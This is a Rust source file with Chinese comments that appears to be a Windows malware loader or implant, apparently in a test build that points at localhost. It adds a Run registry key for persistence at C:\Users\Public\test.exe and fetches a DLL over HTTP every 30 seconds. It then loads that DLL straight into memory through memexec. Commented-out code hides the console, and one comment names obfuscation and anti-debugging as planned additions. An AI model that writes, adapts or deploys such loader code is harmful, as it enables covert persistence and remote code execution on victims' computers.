use std::path::Path;
use winreg::enums::*;
use winreg::RegKey;
use std::thread;
use std::time::Duration;
use memexec::memexec_dll;
use memexec::peloader::def::DLL_PROCESS_ATTACH;
use reqwest::{blocking::Client};


fn main() {
    // hide_console_window();
    // 创建 HTTP 客户端
    let client = Client::new();
    let mut buf = vec![];
    //花指令、反调试

    //自启动操作
    // let key = r#"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"#;
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("Software").join("Microsoft").join("Windows").join("CurrentVersion").join("Run");
    let (key, disp) = hkcu.create_subkey(&path).unwrap();
    key.set_value("Path", &"\"C:\\Users\\Public\\test.exe\"").unwrap();
    loop {
        let request = client
            .get("http://127.0.0.1:8000/hello.dll")
            .build().expect("fail");
        let response: Result<reqwest::blocking::Response, reqwest::Error> = client.execute(request);
        if let Ok(mut response) = response {
            // println!("{:?}",response);
            response.copy_to(&mut buf).expect("get respponse fail...");
            //内存加载dll
            unsafe {
                // DLL's entry point is DllMain
                memexec_dll(&buf, 0 as _, DLL_PROCESS_ATTACH, 0 as _).expect("fail to get ....");
            }
            buf.clear();
        }
        thread::sleep(Duration::from_secs(1 * 30));
    }
}
// fn hide_console_window() {
//     unsafe { winapi::um::wincon::FreeConsole() };
// }